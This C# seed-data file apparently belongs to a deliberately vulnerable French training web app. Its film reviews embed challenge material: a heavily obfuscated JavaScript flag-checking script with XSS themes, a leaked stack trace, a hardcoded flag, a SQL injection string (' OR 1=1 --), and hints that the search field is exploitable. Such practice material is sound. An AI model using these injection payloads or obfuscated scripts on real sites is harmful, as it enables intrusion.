._$_+""></""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+ಠ__ಠ.$$$_+ಠ__ಠ.$_$_+ಠ__ಠ.$$_$+""><""+ಠ__ಠ.__+ಠ__ಠ.$_$$+ಠ__ಠ._$+ಠ__ಠ.$$_$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$$+ಠ__ಠ.__$+"">';\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+ಠ__ಠ.$$$$+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""(\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.$$_+ಠ__ಠ.$_$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.___+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.$$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$$$_+ಠ__ಠ.$$_$+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$__+ಠ__ಠ.$$$+"")\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""{\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+ಠ__ಠ.$$__+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""+=\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\\""<""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+""><""+ಠ__ಠ.__+ಠ__ಠ.$$_$+"">\\\""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""+\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$__+ಠ__ಠ.$$$+""[\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.___+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.$$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$$$_+ಠ__ಠ.$$_$+""].""+ಠ__ಠ._+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""+\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\\""</""+ಠ__ಠ.__+ಠ__ಠ.$$_$+""><""+ಠ__ಠ.__+ಠ__ಠ.$$_$+"">\\\""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""+\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$__+ಠ__ಠ.$$$+""[\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.___+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.$$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$$$_+ಠ__ಠ.$$_$+""].""+ಠ__ಠ.$$__+ಠ__ಠ._$+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""+\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\\""</""+ಠ__ಠ.__+ಠ__ಠ.$$_$+""><""+ಠ__ಠ.__+ಠ__ಠ.$$_$+"">\\\""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""+\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$_$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$__+ಠ__ಠ.$$$+""[\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.___+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.$$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$$$_+ಠ__ಠ.$$_$+""].\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.___+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.$$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.___+ಠ__ಠ.$__+ಠ__ಠ.$_$_+ಠ__ಠ.__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""+\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\\""</""+ಠ__ಠ.__+ಠ__ಠ.$$_$+""></""+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+"">\\\""\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""}\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+ಠ__ಠ.$$__+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""+=\\""+ಠ__ಠ.$__+ಠ__ಠ.___+""\\\""</""+ಠ__ಠ.__+ಠ__ಠ.$_$$+ಠ__ಠ._$+ಠ__ಠ.$$_$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$$+ಠ__ಠ.__$+""></""+ಠ__ಠ.__+ಠ__ಠ.$_$_+ಠ__ಠ.$_$$+(![]+"""")[ಠ__ಠ._$_]+ಠ__ಠ.$$$_+"">\\\"";\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""$('.\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.___+ಠ__ಠ._+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+""\\""+ಠ__ಠ.$__+ಠ__ಠ.___+"".""+ಠ__ಠ._+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+"".""+ಠ__ಠ.$$__+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+ಠ__ಠ.$_$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+""').\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ._$_+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$$_+ಠ__ಠ.___+(![]+"""")[ಠ__ಠ._$_]+ಠ__ಠ.$_$_+ಠ__ಠ.$$__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+ಠ__ಠ.$$$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.__$+ಠ__ಠ.__+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.___+""(""+ಠ__ಠ.$$__+ಠ__ಠ._$+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+ಠ__ಠ.$$$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.$_$+ಠ__ಠ.$$_+ಠ__ಠ.__+"");\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+""\\""+ಠ__ಠ.__$+ಠ__ಠ.__$+""});\\""+ಠ__ಠ.__$+ಠ__ಠ._$_+""};""+""\"""")())();
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('b o=""[m,7,3,4,j,8,3,4,1N,7,3,4,k,5,3,4,E,7,3,4,1D,C,3,4,D,5,3,4,m,8,3,4,m,r,3,4,s,7,3,4,m,7,3,4,k,5,3,4,B,7,3,4,s,8,3,4,D,8,3,4,h,8,3,4,1E,5,3,4,s,7,3,4,h,5,3,4,u,5,3,4,h,C,3,4,u,5,3,4,1F,5,3,4,k,5,3,4,E,r,3,4,B,r,3,4,j,8,3,4,k,5,3,4,j,7,3,4,u,5,3,4,h,5,3,4,j,8,3,4]"";b 6=1G.1H(\'z 1K 1J 1I 1C 1B 1v 1u 1t 1s 1w-1x 1A 1z o 1y z\');v(6!=1L){6=1M(6.1Z(/[a-1Y-Z]/g,A(c){1X 21.22((c<=""Z""?25:24)>=(c=c.l(0)+13)?c:c-26)}));b f="""";y(b i=0;i<6.q;i++){f+=\'\\\\x\'+6[i].l(0).23(16)}6=[];y(b i=0;i<f.q;i++){6.1W(i%2?f[i].l(0):f[i].l(0)+20)}6.1V();b t="""";6.1O(A(e){t+=e+"",""});6=""[""+t.1r(0,t.q-1)+""]""}v(6!=o){1Q.1R()}1U{$(\'#1T\').1S(\'<27 1k=""P:O/N;R,S+M/W+F+U/Y/9/J/L/H/K+I+G+X/1q+1j+1i+1h/1g/10/1l/1p+V/1o/1n+1m+1f/1e/17+15//14/11/28+18+19/1d+1c/1b/1a+1P+2o/3l+p/3m/3k/3j/3h+3i+3n+3o+3t/3u+3s/3r/3p/3q/3g/3f+35/36/d+34/33/31/32+37/38/3d/3e/3c+3b+39+3w/3a+3v+3z/3L/3K+3J/3H/3A/3I+3y/3x/3B/3C+3G/3F/3E/3D+2Z/2r/2q+2p/2n/30+2s+2t+2x+2w+2v+/2u/2m++n+2l//2d/2c/2b+29/2a//Q/2e+2f+2k/2j+2i/2g/2h+2y+2z+2S/2R/2Q/2O+/2P/2T+2U/2Y+2X+2W+2V+T+2N/2M/2E+2D+2C/2A+2B+2F/2G+2L+2K+/w/2J/2H+F+2I///12=="">\')}',62,234,'|||120|112|72|input|71|73|||var||||intermediate||54||53|100|charCodeAt|49||flag||length|75|57||101|if|||for|o__o|function|51|74|56|52|AAA24HBBwDYDgw|sj5GOE84eNT1FVBR|HD3wo4Lt85OCjm2e482v7JajkT9RxPHYC0ISL7e6r8|eoQfP5Iesng2xSMFvBtPn7w2U39xvwpP9jwj4F1Kjba1CoKM7|vOv757C39uvX7e|S59N6D7727A52PHXx8|fbPGk7sqHT35mb|fkAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAxESURBVHhe7ZzteRu5DoVTVwpSPakmzaSYXYIkvkhghrIlSyOe9xcJHhxgRhSu78aPf|png|image|data||base64|iVBORw0KGgoAAAANSUhEUgAAAagAAABVCAIAAACTq||AMB2YPABALYDgw8AsB0YfACA7cDgAwBsBwYfAGA7MPguzb8||0HAACbgcEHANgODD4AwHZg8AEAtgODDwCwHRh8AIDtwOADAGwHBh8AYDsw|UafSPjYkTJ3H|v3||bLLIXSqP1MtnwdKUoqDG|oJi8yFi|gdx5a31q4mlzgAAAABJRU5ErkJggg||6tYb0nZ6VxqkU|OEpcSlYW07WupmtqagJGPv||Cdk9I6SoGk7uwc1fI1Jrx3Za2ruLoNrPRv9BJfbEBxRm4jTkOtrInYO6w|7anZnb1dbz5G2JsztY7zE72Z5Vrrj|yR8JEhpnNU9dJ7PXOi0z7QrgfWjssRbo0n|qYFpMxTmuHF0ctKPlYzWUQ2tS1|bK0QR2Xr3zhBU75o66tPSDcrxIZNAhC0QJ3UDZ40MNYiTPle7YqRWbY4zbVrSP4X7cop|MyOlnpS03|g17idzfgFG4jTqPJWW9CWn04kMzF5vO67cSepyZgZOOf|iJX4XyA2ipYUrY|XavTe6GlDbp|VClmiLSuJi861u38g7ITuNkoZ9QxMwssVPfLxul09uw9|Sa|dMbrpcLGroFaipKCm2fem8lpRW15qgCmnJZMelAWil0qF0ISCt7|c54p|src|48tqiEr7JM|FR2|8cmHb2|o1ZL9o3aw0otZSp5TamljNxelOYNUJS3SUaw8XmaelELZ6okzAY2eG|QedJmVnd2jmpZTybqU1nrKqhFIafsGy|aR1Z|substr|cette|avoir|faire|te|fois|ci|suivant|le|entre|pas|veux|99|98|55|window|prompt|ne|tu|Si|null|btoa|50|forEach|uNj|document|xss|html|powned|else|reverse|push|return|zA|replace||String|fromCharCode|toString|122|90||img|LsvuBDfhddv7C0RCe578AnV1pGXnd2niLjU1Z8qeF4saup1liJjuteFhXpf9BLfL2BjvN3G3Eaap32JqTVfWJWaTHd1OV8I0hNwMgGgy|6JCs8fPD5Nxw8WBGUEF3aypjLiEdiaOvadSfMsv49gfpgXbY2aVLFWkmdWib6m8nWLckVymmpQhkV81wmT9Lm3oYIbW2D8cYkOYF|HFUNf16YSQWhv8GcH7bkmnZPc1qiMRXyJsxqPyVYHpI8OC4yefgVTSH0tyQCE7Zt9RCVsIlSMnQrTcYXOK0uj9VoJ2GQoUN97lpRX8LP8ZLBV15Gj9ZNl9Mb4UzjmhqyxmiVwyw9cEXj9ZBQsUpTnsJ6YMiqRK1TLHo|wyyiN9xODbhPccfE|jojV7p4hzcgId8kUKe5|tn|z9mBb08qXO4z8|3PTP4micVpJktkMj0Mn3EI9ijoPBWePTOeqrassxcazdVSicVKImWVk6fz7pi7d2my6xYrGtWHjQiJYuxVTLHXT7hy5vq|ML3IypGzrJqRZSfmjtfTWPdJWXZJFD9JcIW3Qp7Jk6C2KFIu6|nsrSeWUNqbK2LUc|TwUFsaaFFmm4uqmbNu3I9NZUPMJgzoLkKbzD4KtbCg|CawWcelRWjj2QeGNZ3WL7KY4lCmjWXl228pgSbcdCqNXB4tzBXmBscBEYS9zb0IMXLGf3RkWanZXTVkIraNTHI1hunuJVOmb4OkadYra5PSzTmQmFsDg2Ppv7uwG3UZEFD0cP|MfxhUyKqfF0LJT|M9f7WndPWqd|7UD7wK3p6aU8FX2L8jL79VsnkZd|Q8gvI4ABh8VweDD4MP3A8G38XB4MPgA|0ZkQ1ZbqoJyagssN|EP5TqDD4SU67rPbY2hr|xLEmNJpAkgrjXdYLNG7shQptvSRbZ7mmLfssPtWiNsOzhz6FrG7HV4rEYlyYe7L9lPVC3XbgnWKx78304avUB26IOosXssaMuCx7nIJhC86yocarr6Kj53J2mBK14RrlbM47a6BmB|LDL762RH82dDnVIn|lOc5v4zTf01|zj832zf5gW91L55zRdb4|VI|vLwyx|B0H|uArt27iAtdw|YNBxqZKJuB|DD5ztspTbBFdJ3oTrrq5kDfszLJRJK9IFoTb|ZyUaU6HpIStBP|ErIp1ku436rmgKWpII|9zZFKDfPebRomTfuhoJNp48OfF2ZSgR4QR4lyFqfYnnx|lNujc|kD1mg07D9yOh|o8F0tbRrShwNueFbq4hz0l14jAokJEGi3ZS|AjfHnx3Qw|OADAIAXg8EHANgODD4AwHZg8AEAtgODDwCwHRh8AIDtwOADAGwHBh8AYDsw|AMB2YPABALYDgw8AsB0YfACA7cDgAwBsBwYfAGA7MPgAANuBwQcA2A4MPgDAdmDwAQA247|Jn8|8MNh3hXJsLvfr5h4G39uB9wOuAt1VgQdcGAwpc|evFxQwPsB18CPsD7DwmDfEP5604x8zWXH4Hs38H7ANfBTq0|SMghr8D3GiPajQ9XqAjRRMjQ4pxbtBDIcoqcJHZJl6LTUGbDVu1Bg5|6fXO76dzrFXmrFW1JgramLX2lTCYwljEmsaxplabYnsz6tERjLuQMmbif6BXRUrLdRn1XNVwxJBGY7mmp1g2t5vOzcsbOkVef1WHQMHdyKH8Wjx98|ScyJadZcXrbZmuFY2mqUVNGDNFeYG6ytW|AZC5tIs2j|8YUv6cCwbug|C1hwVF1c3dQteBnGk7xVMZhhMUfXP8lY|OZONBQd8B3kAn|6xXkusmdWvqtjAHSV9KJgi69fg6RJ5itbo|LdGYC4Wx836KIng2t0maizWj|CjZSM37db|T9cQNdmTEZMZcrxGpzecZQ1lVJavGUqtscFDiJIq5iDLFVy7qjYWtBzrSG|hkePviGlz3|0QmsK0GmpUmLNbOkOkpLrAgDOaUksM9|8ioZJLGtanaYI2oZt1OevuNkePp|eDwQcA2A4MPgDAdmDwAQC2A4MPALAdGHwAgO3A4FPc738|2C38dH|0q7uL|pL4DB93jsDbrEbXpkk8Xrod|XC7|Be7jEi8w5ptPfj|0rrji|78uFvmEP4BKDjz4Sod4l|yHFN8xmqdZEh5xyUiL0RauUFNFaZWxrv5|p3dU4UtAkLoJjj5cOuOctjYb9o9tfXxlbXJpyeEq6nGSa4Iylj3zyeoqVhCLvbcn6yexSrpJwjZOYafpm7rkhIV4VouWHK4i05pPUJXHmLUsuwkqCnSu2ro6SYnaGFPM|nQwTd|VTZQWzhqogvDgI7noT3x|ZtVPSsNnxYd67F8rjuQm8lWDzknUj5LF7IfHzhnlFX5oMwydazomfnr8Jhzvn4JGVug9|ZOsmloDPq1erK|YVegVx7vHVNwcynEPcsLDRpo|ts|0F7jM4HvzXwqgWxP9lvwlbtMjmyxe|97UuP6M0|NrDSh0Knq3cU5hb05OktG8EFZvieIZl6yE6QWT6|BE4pQWlTYajdznzMP6P6R3Vn56jWXKMgwuEVVeaMqKuolou6lyNx|Kh6Ou|45NPfPz0aV|7rmr894T0Rrb56Ba|u2hBWTudjmfOTgA|B9aIOvb17DG7TwbmDwAfBUXj91SgfBj6d7g8EHwFPBj1vvCAYfAGA7MPgAANuBwQcA2A4MPgDAdmDwAQC2A4Pv8dhfFr3EL44|8zZ4Fe|Mhd|86xYV|mfNL|skn|G7YV|tqygePbpOk|VkDhcjxc|GHOFzSgstxG9HmttYuXqe5|YyP54MH3|3kVuT2fqLFa|FUyFNNz6E6JJ4Wsvri3xqocMO|qAk9GexNobBR|WJT96zsNCkMHWV9XNg1Y6sIBfnvWWVzuJpLX8gNqYFzxRfbGRmrnCaomiytXEGd7jtwqUGX7|HVzdOcUk1HhQ9Sjel57kBZoWHCTy8S|B1b16O4|D9ggn5nvgou4jS8W2to7l6wXckkiz2JtLBTvEqfPfNK6wkqTDAl8V1k|IhH7GdDD|h4PnjwDbCCj6ZP3nm6jVyo3NbeuXid5rpS5lmsjWEIqz7xyXsW1PJAzEd5cmWhLmeYhs|VwYhOKQVmS0FnOaUpjasPXdw6y4|AnGaErVhbVwvp26Ey|aR1o2qpeFDbFlylrIMgntbyegnTysRJ5fpQjhoJKzK|TXFcqsTR4udEnPnnPglbKxBSPmilk'.split('|'),0,{}))
</script>
</div>",
                        LastUpdated = new DateTime(2017, 05, 28, 22, 28, 30),
                    });

            await CreateMediaReview(3,
                    new Review(3)
                    {
                        UserName = "brandon.mayhew",
                        Content = @"Wah les mecs je suis tombé sur un truc trop chelou en chargeant la page :o<br/>
Ca m'a affiché ça : <br/><pre>
System.ArgumentNullException: Value cannot be null.
   at CFlix.Controllers.MediaController.&lt;Detail&gt;d__3.MoveNext() in V:\AR\CFlix\CFlix\Controllers\MediaController.cs:line 31
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at Microsoft.AspNetCore.Mvc.Internal.ControllerActionInvoker.&lt;InvokeActionMethodAsync&gt;d__27.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at Microsoft.AspNetCore.Mvc.Internal.ControllerActionInvoker.&lt;InvokeNextActionFilterAsync&gt;d__25.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at Microsoft.AspNetCore.Mvc.Internal.ControllerActionInvoker.Rethrow(ActionExecutedContext context)
   at Microsoft.AspNetCore.Mvc.Internal.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted)
   at Microsoft.AspNetCore.Mvc.Internal.ControllerActionInvoker.&lt;InvokeNextResourceFilter&gt;d__22.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at Microsoft.AspNetCore.Mvc.Internal.ControllerActionInvoker.Rethrow(ResourceExecutedContext context)
   at Microsoft.AspNetCore.Mvc.Internal.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted)
   at Microsoft.AspNetCore.Mvc.Internal.ControllerActionInvoker.&lt;InvokeAsync&gt;d__20.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at Microsoft.AspNetCore.Builder.RouterMiddleware.&lt;Invoke&gt;d__4.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at Microsoft.AspNetCore.Authentication.AuthenticationMiddleware`1.&lt;Invoke&gt;d__18.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at Microsoft.AspNetCore.Authentication.AuthenticationMiddleware`1.&lt;Invoke&gt;d__18.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at Microsoft.AspNetCore.Authentication.AuthenticationMiddleware`1.&lt;Invoke&gt;d__18.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at Microsoft.AspNetCore.Authentication.AuthenticationMiddleware`1.&lt;Invoke&gt;d__18.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at Microsoft.AspNetCore.Authentication.AuthenticationMiddleware`1.&lt;Invoke&gt;d__18.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at Microsoft.AspNetCore.Authentication.AuthenticationMiddleware`1.&lt;Invoke&gt;d__18.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at Microsoft.AspNetCore.Authentication.AuthenticationMiddleware`1.&lt;Invoke&gt;d__18.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at Microsoft.AspNetCore.Authentication.AuthenticationMiddleware`1.&lt;Invoke&gt;d__18.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at Microsoft.VisualStudio.Web.BrowserLink.BrowserLinkMiddleware.&lt;ExecuteWithFilter&gt;d__7.MoveNext()
--- End of stack trace from previous location where exception was thrown ---
   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
   at Microsoft.AspNetCore.Diagnostics.DeveloperExceptionPageMiddleware.&lt;Invoke&gt;d__7.MoveNext()</pre>
",
                        IsHidden = true,
                        LastUpdated = new DateTime(2017, 04, 21, 15, 34, 50),
                    },
                    new Review(3)
                    {
                        UserName = "cflix.administrateur",
                        Content = "Oups merci de nous avoir fait remonter ce léger soucis." +
                        "Nous l'avons corrigé, vous ne devriez plus retomber dessus." +
                        "Pour vous remercier de votre aide, nous vous donnons un easter egg spécial ;) : <b>CFl1X-Thx_4_y0ur_H31P_:)</b>",
                        LastUpdated = new DateTime(2017, 04, 21, 17, 13, 25),
                        IsHidden = true
                    },
                    new Review(3)
                    {
                        UserName = "brandon.mayhew",
                        Content = "Trop bien j'aime bien les oeufs de pâques !! Merci :D",
                        LastUpdated = new DateTime(2017, 04, 21, 21, 42, 43),
                    },
                    new Review(3)
                    {
                        UserName = "brandon.mayhew",
                        Content = "Euh, attendez je dois en faire quoi ??",
                        LastUpdated = new DateTime(2017, 04, 21, 21, 42, 59),
                    },
                    new Review(3)
                    {
                        UserName = "cflix.administrateur",
                        Content = "En vous rendant dans la section achievement (lien dans le menu de navigation) vous aurez la possibilité de saisir le easter egg qui vous débloquera un succès bonus.",
                        LastUpdated = new DateTime(2017, 04, 21, 21, 59, 10),
                    },
                    new Review(3)
                    {
                        UserName = "brandon.mayhew",
                        Content = "Oulah c'est compliqué, j'vais essayer mais j'vous promez rien m'sieur white :)",
                        LastUpdated = new DateTime(2017, 04, 21, 23, 34, 26),
                    },
                    new Review(3)
                    {
                        UserName = "brandon.mayhew",
                        Content = "Niquel je l'ai activé ! Jesse m'a aidé :D",
                        LastUpdated = new DateTime(2017, 04, 23, 6, 37, 15),
                    },
                    new Review(3)
                    {
                        UserName = "hank.schrader",
                        Content = "On dirait qu'il y a des trafics suspects qui se trament ici !",
                        LastUpdated = new DateTime(2017, 04, 23, 6, 37, 15),
                    },
                    new Review(3)
                    {
                        UserName = "hackonymousoflix",
                        Content = "cuicui' OR 1=1 --%20",
                        LastUpdated = new DateTime(2017, 05, 28, 23, 34, 2),
                    },
                    new Review(3)
                    {
                        UserName = "hackonymousoflix",
                        Content = "<br/><!-- Si vous aussi vous êtes curieux de savoir ce qu'ils ont bien pu se dire, il semblerait que le champ de recherche sur l'accueil soit plus facilement exploitable ;) -->",
                        LastUpdated = new DateTime(2017, 05, 28, 23, 36, 58),
                    });

            await CreateMediaReview(4,
                    new Review(4)
                    {
                        UserName = "waldo",
                        Content = "Politics, politics, politics, ... ",
                        LastUpdated = new DateTime(2017, 05, 27, 12, 12, 12),
                    },
                    new Review(4)
                    {
                        UserName = "hackonymousoflix",
                        Content = "<br/><!-- Au cas où vous n'auriez pas fait attention, dans le précédent challenge Badger a donné une infrmation cruciale :o" +
                        "... Bon par contre je suis passé avant vous et je vous ai laissé une nouvelle épreuve à la place ;) -->",
                        LastUpdated = new DateTime(2017, 05, 28, 23, 59, 58)
                    });

